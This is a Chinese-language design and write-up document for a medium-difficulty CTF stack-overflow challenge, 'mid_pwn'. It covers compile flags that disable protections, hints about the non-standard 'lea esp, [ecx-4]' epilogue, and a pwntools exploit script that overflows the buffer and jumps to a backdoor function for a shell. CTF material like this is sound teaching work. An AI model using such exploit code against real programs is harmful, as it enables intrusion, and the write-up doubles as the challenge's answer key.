# 赛题设计说明

## 题目信息：

* 题目名称：mid_pwn
* 预估难度：中等
* 编译命令：gcc -m32 mid.c -no-pie -fno-stack-protector -z noexecstack -z lazy -o0 -o mid_pwn

## 题目描述

> 中等难度栈溢出

## 题目考点

1. 栈溢出
2. gdb等调试器的使用

## 思路简述

非常规栈溢出题，主要难点在于`leave`之后并非直接`retn` 而是接了`lea esp , [ecx - 4]`之后再ret; 为减轻难度,`ebp - 4`地址已在开始给出,因此最后是通过控制`[ecx - 4]`这一地址的内容来跳转后门函数获取shell

## 题目提示

1. 看main()函数的汇编代码，在返回阶段的汇编代码与常规的`leave retn`有何不同?
2. 题目一开始给了一个意义不明的地址，是用来做什么的?可以用gdb调试来查看
3. retn的实质是将esp所指向的地址中的内容 pop eip, 作为下一条指令执行,而esp已被`mov ecx, [ebp+var_4]` 以及 `lea esp, [ecx-4]`这两行修改,考虑如何控制esp中内容?

## 题目环境

1. Ubuntu 16.04 LTS

## 题目write up

关键在于

```
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
```

这四行汇编指令
使得首先需要满足ecx中地址可访问(地址已在题目开始直接给出)
其次实际的返回地址并非`ebp + 4`
而是`[ecx - 4]`
通过gdb调试可以获得[ecx - 4]距ebp的偏移，即可获取shell

```python
from pwn import *
sh = process('./mid')
context.log_level = 'DEBUG'
sh.recvuntil('what\'s your name?,')
ecx = int(sh.recv()[2:10],16)
log.info('ecx = ' + hex(ecx))
#gdb.attach(sh)
backdoor = 0x0804851b
payload = 'A' * 28 + p32(ecx) + 'A'*20 + p32(backdoor)
sh.sendline(payload)
sh.interactive()
```
